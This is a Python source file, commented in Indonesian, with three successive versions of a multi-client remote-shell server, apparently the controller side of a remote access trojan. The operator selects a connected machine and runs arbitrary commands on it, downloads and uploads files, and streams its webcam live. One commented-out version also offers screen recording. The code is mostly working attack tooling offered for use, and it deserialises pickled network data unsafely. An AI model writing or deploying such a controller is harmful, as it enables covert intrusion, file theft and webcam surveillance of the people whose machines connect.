# import socket
# import json
# import os
# import cv2

# # Membuat socket dan menunggu koneksi dari klien
# soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# soc.bind(('192.168.0.124', 8888))
# soc.listen(2)

# print("Menunggu koneksi...")

# target, ip = soc.accept()
# print(f"Terhubung ke {ip}")

# def data_diterima():
#     """Menerima data dari klien dengan penanganan JSON yang aman."""
#     data = ''
#     while True:
#         try:
#             chunk = target.recv(1024).decode()
#             if not chunk:
#                 break  # Jika koneksi terputus
#             data += chunk
#             return json.loads(data)  # Memastikan data dalam format JSON
#         except json.JSONDecodeError:
#             continue  # Jika JSON belum lengkap, tunggu data berikutnya

# def download_file(nama_file):
#     """Mengunduh file dari klien."""
#     try:
#         target.sendall(json.dumps({"command": "download", "file": nama_file}).encode())
#         with open(nama_file, "wb") as file:
#             while True:
#                 data = target.recv(4096)
#                 if data == b"DONE":
#                     break
#                 file.write(data)
#         print(f"File {nama_file} berhasil diunduh.")
#     except Exception as e:
#         print(f"Error saat mengunduh file: {str(e)}")

# def upload_file(nama_file):
#     """Mengunggah file ke klien."""
#     try:
#         if not os.path.exists(nama_file):
#             print(f"File {nama_file} tidak ditemukan.")
#             return
#         target.sendall(json.dumps({"command": "upload", "file": nama_file}).encode())
#         with open(nama_file, "rb") as file:
#             while chunk := file.read(4096):
#                 target.sendall(chunk)
#         target.sendall(b"DONE")
#         print(f"File {nama_file} berhasil dikirim.")
#     except Exception as e:
#         print(f"Error saat mengunggah file: {str(e)}")


# def komunikasi_shell():
#     """Mengirim perintah ke klien dan menerima hasilnya."""
#     while True:
#         perintah = input("preter> ")
        
#         if perintah.lower() in ["exit", "quit"]:
#             print("Menutup koneksi...")
#             target.sendall(json.dumps({"command": "exit"}).encode())
#             target.close()
#             soc.close()
#             break

#         elif perintah.startswith("download "):
#             file_name = perintah.split(" ", 1)[1]
#             download_file(file_name)
        
#         elif perintah.startswith("upload "):
#             file_name = perintah.split(" ", 1)[1]
#             upload_file(file_name)

#         elif perintah == "kamera":
#             target.sendall(json.dumps({"command": "kamera"}).encode())
#             hasil = data_diterima()
#             print(hasil)
        
#         elif perintah == "screen_record":
#             target.sendall(json.dumps({"command": "screen_record"}).encode())
#             hasil = data_diterima()
#             print(hasil)
         

#         else:
#             try:
#                 target.sendall(json.dumps({"command": "execute", "cmd": perintah}).encode())
#                 hasil = data_diterima()
#                 print(hasil)
#             except Exception as e:
#                 print(f"Error: {str(e)}")
#                 break

# # Menjalankan komunikasi shell
# komunikasi_shell()





# import socket
# import json
# import threading
# import os

# class RemoteShellServer:
#     def __init__(self, host='0.0.0.0', port=8888):
#         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         self.server_socket.bind((host, port))
#         self.server_socket.listen(5)
#         self.clients = {}
#         print("Menunggu koneksi...")
#         threading.Thread(target=self.accept_clients, daemon=True).start()
    
#     def accept_clients(self):
#         """Menerima koneksi dari klien."""
#         while True:
#             client_socket, client_address = self.server_socket.accept()
#             print(f"Terhubung ke {client_address}")
#             self.clients[client_address] = client_socket
    
#     def send_command(self, client_address, command):
#         """Mengirim perintah ke klien tertentu."""
#         if client_address in self.clients:
#             client_socket = self.clients[client_address]
#             try:
#                 client_socket.sendall(json.dumps(command).encode())
#                 response = client_socket.recv(4096).decode()
#                 return response
#             except Exception as e:
#                 return f"Kesalahan: {str(e)}"
#         else:
#             return "Klien tidak ditemukan."
    
#     def download_file(self, client_address, file_name):
#      if client_address in self.clients:
#         client_socket = self.clients[client_address]
#         client_socket.sendall(json.dumps({"command": "download", "file": file_name}).encode())

#         with open(file_name, "wb") as file:
#             while True:
#                 data = client_socket.recv(4096)
#                 if data.endswith(b"DONE"):
#                     file.write(data[:-4])  # Simpan data tanpa "DONE"
#                     break
#                 file.write(data)

#         print(f"File {file_name} berhasil diunduh.")
#      else:
#         print("Klien tidak ditemukan.")

    
#     def upload_file(self, client_address, file_name):
#         """Mengunggah file ke klien."""
#         if client_address in self.clients:
#             client_socket = self.clients[client_address]
#             if not os.path.exists(file_name):
#                 print(f"File {file_name} tidak ditemukan.")
#                 return
#             client_socket.sendall(json.dumps({"command": "upload", "file": file_name}).encode())
#             with open(file_name, "rb") as file:
#                 while chunk := file.read(4096):
#                     client_socket.sendall(chunk)
#             client_socket.sendall(b"DONE")
#             print(f"File {file_name} berhasil dikirim.")
#         else:
#             print("Klien tidak ditemukan.")
    
#     def interactive_shell(self):
#         """Memungkinkan admin mengontrol klien tertentu."""
#         while True:
#             print("\nKlien yang tersedia:")
#             for i, addr in enumerate(self.clients.keys()):
#                 print(f"[{i}] {addr}")
#             try:
#                 index = int(input("Pilih klien (nomor) atau -1 untuk keluar: "))
#                 if index == -1:
#                     break
#                 client_address = list(self.clients.keys())[index]
#             except (ValueError, IndexError):
#                 print("Pilihan tidak valid.")
#                 continue
            
#             while True:
#                 command = input("preter> ")
#                 if command.lower() in ["exit", "quit"]:
#                     self.send_command(client_address, {"command": "exit"})
#                     del self.clients[client_address]
#                     break
#                 elif command.startswith("download "):
#                     file_name = command.split(" ", 1)[1]
#                     self.download_file(client_address, file_name)
#                 elif command.startswith("upload "):
#                     file_name = command.split(" ", 1)[1]
#                     self.upload_file(client_address, file_name)
#                 else:
#                     response = self.send_command(client_address, {"command": "execute", "cmd": command})
#                     print(response)

# if __name__ == "__main__":
#     server = RemoteShellServer()
#     server.interactive_shell()













import socket
import json
import threading
import os
import cv2
import pickle
import struct

class RemoteShellServer:
    def __init__(self, host='0.0.0.0', port=8888):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((host, port))
        self.server_socket.listen(5)
        self.clients = {}
        print("Menunggu koneksi...")
        threading.Thread(target=self.accept_clients, daemon=True).start()

    def accept_clients(self):
        """Menerima koneksi dari klien."""
        while True:
            client_socket, client_address = self.server_socket.accept()
            print(f"Terhubung ke {client_address}")
            self.clients[client_address] = client_socket

    def send_command(self, client_address, command):
        """Mengirim perintah ke klien tertentu."""
        if client_address in self.clients:
            client_socket = self.clients[client_address]
            try:
                client_socket.sendall(json.dumps(command).encode())
                response = client_socket.recv(4096).decode()
                return response
            except Exception as e:
                return f"Kesalahan: {str(e)}"
        else:
            return "Klien tidak ditemukan."

    def download_file(self, client_address, file_name):
        """Mengunduh file dari klien."""
        if client_address in self.clients:
            client_socket = self.clients[client_address]
            client_socket.sendall(json.dumps({"command": "download", "file": file_name}).encode())

            with open(file_name, "wb") as file:
                while True:
                    data = client_socket.recv(4096)
                    if data.endswith(b"DONE"):
                        file.write(data[:-4])  # Simpan data tanpa "DONE"
                        break
                    file.write(data)

            print(f"File {file_name} berhasil diunduh.")
        else:
            print("Klien tidak ditemukan.")

    def upload_file(self, client_address, file_name):
        """Mengunggah file ke klien."""
        if client_address in self.clients:
            client_socket = self.clients[client_address]
            if not os.path.exists(file_name):
                print(f"File {file_name} tidak ditemukan.")
                return
            client_socket.sendall(json.dumps({"command": "upload", "file": file_name}).encode())
            with open(file_name, "rb") as file:
                while chunk := file.read(4096):
                    client_socket.sendall(chunk)
            client_socket.sendall(b"DONE")
            print(f"File {file_name} berhasil dikirim.")
        else:
            print("Klien tidak ditemukan.")

    def kamera_live(self, client_address):
        """Menerima stream kamera dari klien."""
        if client_address in self.clients:
            client_socket = self.clients[client_address]
            client_socket.sendall(json.dumps({"command": "kamera"}).encode())

            data = b""
            payload_size = struct.calcsize("L")

            while True:
                while len(data) < payload_size:
                    data += client_socket.recv(4096)

                packed_size = data[:payload_size]
                data = data[payload_size:]
                frame_size = struct.unpack("L", packed_size)[0]

                while len(data) < frame_size:
                    data += client_socket.recv(4096)

                frame_data = data[:frame_size]
                data = data[frame_size:]

                frame = pickle.loads(frame_data)

                cv2.imshow("Live Kamera", frame)

                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break

            cv2.destroyAllWindows()

    def interactive_shell(self):
        """Memungkinkan admin mengontrol klien tertentu."""
        while True:
            print("\nKlien yang tersedia:")
            for i, addr in enumerate(self.clients.keys()):
                print(f"[{i}] {addr}")
            try:
                index = int(input("Pilih klien (nomor) atau -1 untuk keluar: "))
                if index == -1:
                    break
                client_address = list(self.clients.keys())[index]
            except (ValueError, IndexError):
                print("Pilihan tidak valid.")
                continue

            while True:
                command = input("preter> ")
                if command.lower() in ["exit", "quit"]:
                    self.send_command(client_address, {"command": "exit"})
                    del self.clients[client_address]
                    break
                elif command.startswith("download "):
                    file_name = command.split(" ", 1)[1]
                    self.download_file(client_address, file_name)
                elif command.startswith("upload "):
                    file_name = command.split(" ", 1)[1]
                    self.upload_file(client_address, file_name)
                elif command == "kamera":
                    self.kamera_live(client_address)
                else:
                    response = self.send_command(client_address, {"command": "execute", "cmd": command})
                    print(response)

if __name__ == "__main__":
    server = RemoteShellServer()
    server.interactive_shell()
